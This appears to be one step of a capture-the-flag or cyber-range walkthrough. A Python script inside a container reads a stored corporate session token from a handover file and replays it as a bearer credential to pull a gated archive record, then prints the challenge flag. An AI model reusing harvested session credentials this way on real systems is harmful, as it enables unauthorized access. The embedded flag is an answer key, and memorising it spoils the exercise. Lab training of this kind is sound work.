Requires the archive session (corporate handover). The sequencer side-channel is
independent of the W08 work bundle; `GET /api/sequencer-specs/current` is gated
only on the archive (corporate) session. Run from the connector, which holds that
session and trusts the range CA:

```bash
sudo docker exec -i --user fieldlink cinder-arwc-connector python3 - <<'PY'
import json, ssl, urllib.request, pathlib
ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("/var/lib/fieldlink-connector/handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/sequencer-specs/current", headers=h),
    context=ctx).read())
rec = d["record"]
print("record_id:", rec["record_id"])   # SEQ-CRR-4
print("revision:", rec["revision"])      # 4
print("opcodes:", list(rec["opcodes"].keys()))
print("flag:", d["flag"])                # FLAG{3040a0c2f8443498}
PY
```

This GET also sets the `sequencer_descriptor_observed` state that W16.2
(`/api/observations`) requires. Flag in the top-level `flag` field.
